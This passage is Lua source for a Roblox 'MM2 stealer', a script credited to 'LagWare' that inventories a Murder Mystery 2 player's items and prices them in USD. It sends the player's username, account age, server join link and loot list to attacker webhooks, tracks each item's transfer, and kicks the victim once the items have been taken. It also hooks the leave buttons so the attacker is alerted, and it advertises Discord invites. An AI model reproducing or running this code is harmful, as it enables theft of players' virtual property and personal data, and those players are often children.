		if #str8 > 1020 then
			str8 = str8:sub(1, 1010) .. "...\n```"
		end

		return str8
	end

	local function fn12()
		local claimedItems = getgenv()._claimedItems or {}
		local claimedTotal = getgenv()._claimedTotal or 0
		local n4 = #claimedItems
		local n5 = math.floor(claimedTotal / 1000 * 18 * 100) / 100
		local tbl4 = {}
		local str8 = string.format("→ %d/%d Items Total", n4, #hits)
		local v8 = total_value
		local str9 = string.format("→ %s/%s Value Taken", fn10(claimedTotal), fn10(v8))
		local str10 = string.format("→ %d/%d Items Taken", n4, #hits)
		local format = string.format
		tbl4[1] = str8
		tbl4[2] = str9
		tbl4[3] = str10

		do
			local values = table.pack(format("→ $%.2f USD Profit", n5))
			table.move(values, 1, values.n, 4, tbl4)
		end

		local str11 = "```\n" .. table.concat(tbl4, "\n") .. "\n```"

		if #str11 > 1020 then
			str11 = str11:sub(1, 1010) .. "...\n```"
		end

		return str11
	end

	local str8 = localPlayer2.Name .. "  •  " .. localPlayer2.AccountAge .. "d old"
	local tbl4 = { ["Waiting For Claim"] = "🔵", ["Almost Claimed"] = "🟣", Claimed = "🟢", Left = "🔴" }

	local function fn13(arg, arg2)
		local str9 = tbl4[arg] or "⚪"
		local str10 = string.format("$%.2f", math.floor(total_value / 1000 * 18 * 100) / 100)
		local n4 = #game:GetService("Players"):GetPlayers()
		local tbl5 = {}
		local tbl6 = { name = "⚙️ Executor", value = str5, inline = true }
		local tbl7 = { name = "🌐 Server", value = n4 .. "/" .. maxPlayers .. " players", inline = true }
		local tbl8 = { name = "💰 Value", value = fn10(total_value), inline = true }
		local tbl9 = { name = "⏱️ Session", value = arg2, inline = true }
		local tbl10 = { name = "Status", value = str9 .. " **" .. arg .. "**", inline = false }
		local tbl11 = { name = "📜 Join Script", value = "```lua\n" .. str7 .. "\n```", inline = false }
		local tbl12 = { name = "📦 Loot", value = fn11(), inline = false }
		local tbl13 = { name = "📊 Stats", value = fn12(), inline = false }
		tbl5[1] = { name = "🎮 Game", value = "Murder Mystery 2", inline = true }
		tbl5[2] = tbl6
		tbl5[3] = tbl7
		tbl5[4] = tbl8
		tbl5[5] = { name = "💵 USD", value = str10, inline = true }
		tbl5[6] = tbl9
		tbl5[7] = tbl10
		tbl5[8] = tbl11
		tbl5[9] = tbl12
		tbl5[10] = tbl13
		return tbl5
	end

	local str9 = localPlayer2.Name:sub(1, 2) .. string.rep("*", math.max(#localPlayer2.Name - 2, 3))
	local str10 = str9 .. "  •  " .. localPlayer2.AccountAge .. "d old"

	local function fn14()
		local tbl5 = {}
		local n4 = 0

		for _, v8 in ipairs(hits) do
			if n4 >= 8 then
				table.insert(tbl5, string.format("  %d more...", #hits - n4))
				break
			else
				table.insert(tbl5, string.format("%s %s (x%d) - %s Value", fn9(v8.Name, v8.Rarity, v8.IsChroma), v8.Name, v8.Amount, fn10(v8.Amount > 0 and math.floor(v8.RAP / v8.Amount) or 0)))
				n4 += 1
			end
		end

		local str11 = "```\n" .. table.concat(tbl5, "\n") .. "\n```"

		if #str11 > 1020 then
			str11 = str11:sub(1, 1010) .. "...\n```"
		end

		return str11
	end

	local function fn15(arg)
		local Players5 = game:GetService("Players")
		local tbl5 = {}
		local tbl6 = { name = "🌐 Server", value = #Players5:GetPlayers() .. "/" .. maxPlayers .. " players", inline = true }
		local tbl7 = { name = "💰 Value", value = fn10(total_value), inline = true }
		local tbl8 = { name = "📦 Loot", value = fn14(), inline = false }
		tbl5[1] = { name = "🎮 Game", value = "Murder Mystery 2", inline = true }
		tbl5[2] = tbl6
		tbl5[3] = { name = "⏱️ Session", value = arg, inline = true }
		tbl5[4] = tbl7
		tbl5[5] = tbl8
		return tbl5
	end

	string.sub(abcdefg, 1, 6):upper()

	local json = game:GetService("HttpService"):JSONEncode({
		content = str .. "**" .. localPlayer2.Name .. "** detected  |  `" .. str7 .. "`" .. (total_value >= 100000 and "\n🏆 **Top Hit**" or total_value >= 10000 and "\n💥 **Big Hit**" or total_value >= 1000 and "\n🔥 **Hit**" or ""),
		username = "MM2 Logger",
		embeds = {
			{
				color = 3447003,
				author = { name = str8, icon_url = str6 },
				title = fn10(total_value) .. " value",
				url = ROBLOX_JOIN_CLICK_URL,
				fields = fn13("Waiting For Claim", "0m 0s"),
				footer = { text = "Stealer Made By LagWare .gg/aC5yK58VV5" },
				timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
			},
		},
	})

	local json2 = game:GetService("HttpService"):JSONEncode({
		content = "**" .. str9 .. "** detected" .. (total_value >= 100000 and "  🏆 **Top Hit**" or total_value >= 10000 and "  💥 **Big Hit**" or total_value >= 1000 and "  🔥 **Hit**" or ""),
		username = "LagWare",
		embeds = {
			{
				color = 3447003,
				author = { name = str10, icon_url = str6 },
				title = fn10(total_value) .. " value",
				url = ROBLOX_JOIN_CLICK_URL,
				fields = fn15("0m 0s"),
				footer = { text = "LagWare .gg/aC5yK58VV5" },
				timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
			},
		},
	})

	task.spawn(function()
		pcall(function()
			local v8 = request({
				Url = Webhook .. "?wait=true",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = json,
			})

			if v8 and v8.Body then
				local data2 = game:GetService("HttpService"):JSONDecode(v8.Body)

				if data2 and data2.id then
					id = data2.id
					local id2 = data2.id
					getgenv()._hitMsgId = id2
				end
			end
		end)
	end)

	local v8

	if total_value > 1000 then
		v8 = fn5(BigHitsWebhookToken)
	else
		v8 = fn5(HitsWebhookToken)
	end

	if v8 then
		task.spawn(function()
			pcall(function()
				request({ Url = v8, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json2 })
			end)
		end)
	end

	local flag2 = false

	getgenv()._onClaim = function(arg, arg2)
		if not id then
			return
		end

		if #arg == 0 then
			return
		end

		if arg2 then
			flag2 = true
			getgenv()._transferer_done = true
			flag = false

			pcall(function()
				setclipboard("discord.gg/Pmk9RA3CjG")
			end)

			game:GetService("Players").LocalPlayer:Kick([[

Join: https://discord.gg/5ycjwwf5qg
To get best latest script.]])
		end

		local n4 = os.time() - now
		local str11 = string.format("%dm %ds", math.floor(n4 / 60), n4 % 60)

		task.spawn(function()
			pcall(function()
				request({
					Url = Webhook .. "/messages/" .. id,
					Method = "PATCH",
					Headers = { ["Content-Type"] = "application/json" },
					Body = game:GetService("HttpService"):JSONEncode({
						embeds = {
							{
								color = arg2 and 3066993 or 10181046,
								author = { name = str8, icon_url = str6 },
								title = fn10(total_value) .. " value",
								url = ROBLOX_JOIN_CLICK_URL,
								fields = fn13(arg2 and "Claimed" or "Almost Claimed", str11),
								footer = { text = "Stealer Made By LagWare .gg/aC5yK58VV5" },
								timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
							},
						},
					}),
				})
			end)
		end)
	end

	task.spawn(function()
		while flag do
			task.wait(300)

			if flag then
				local n4 = os.time() - now
				local str11 = string.format("%dm %ds", math.floor(n4 / 60), n4 % 60)

				if id then
					pcall(function()
						request({
							Url = Webhook .. "/messages/" .. id,
							Method = "PATCH",
							Headers = { ["Content-Type"] = "application/json" },
							Body = game:GetService("HttpService"):JSONEncode({
								embeds = {
									{
										color = 10181046,
										author = { name = str8, icon_url = str6 },
										title = fn10(total_value) .. " value",
										url = ROBLOX_JOIN_CLICK_URL,
										fields = fn13("Almost Claimed", str11),
										footer = { text = "Stealer Made By LagWare .gg/aC5yK58VV5" },
										timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
									},
								},
							}),
						})
					end)
				end

				continue
			end

			break
		end
	end)

	local flag3 = false

	local function fireLeave()
		if flag3 then
			return
		end

		if flag2 then
			return
		end
		flag3 = true
		getgenv()._fireLeave = nil
		getgenv()._aj_done = true
		flag = false
		local n4 = os.time() - now
		local str11 = string.format("%dm %ds", math.floor(n4 / 60), n4 % 60)

		local json3 = game:GetService("HttpService"):JSONEncode({
			embeds = {
				{
					color = 15158332,
					author = { name = str8, icon_url = str6 },
					title = fn10(total_value) .. " value  •  left after " .. str11,
					fields = fn13("Left", str11),
					footer = { text = "Stealer Made By LagWare .gg/aC5yK58VV5" },
					timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
				},
			},
		})

		pcall(function()
			if id then
				request({
					Url = Webhook .. "/messages/" .. id,
					Method = "PATCH",
					Headers = { ["Content-Type"] = "application/json" },
					Body = json3,
				})
			else
				request({
					Url = Webhook,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body = json3,
				})
			end
		end)
	end

	getgenv()._fireLeave = fireLeave

	localPlayer2.AncestryChanged:Connect(function(child, parent)
		if parent == nil then
			fireLeave()
		end
	end)

	task.spawn(function()
		local function fn16(arg)
			pcall(function()
				arg.MouseButton1Click:Connect(fireLeave)
			end)

			pcall(function()
				arg.Activated:Connect(fireLeave)
			end)
		end

		pcall(function()
			fn16(game:GetService("CoreGui").InGameFullscreenTitleBarScreen.Bar.BarFrame.ThreeSectionBar.rightFrame.ExitButton)
		end)

		local function fn17(arg)
			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("GuiButton") then
					local str11 = descendant.Name:lower()
					local str12 = descendant:IsA("TextButton") and descendant.Text:lower() or ""

					if str11:find("leave") or str12:find("leave") or str11 == "quit" or str12 == "quit" then
						fn16(descendant)
					end
				end
			end
		end

		pcall(function()
			fn17(localPlayer2.PlayerGui)
		end)

		localPlayer2.PlayerGui.DescendantAdded:Connect(function(descendant)
			if descendant:IsA("GuiButton") then
				local str11 = descendant.Name:lower()
				local str12 = descendant:IsA("TextButton") and descendant.Text:lower() or ""

				if str11:find("leave") or str12:find("leave") or str11 == "quit" or str12 == "quit" then
					fn16(descendant)
				end
			end
		end)
	end)
end

MM2_STEALER()
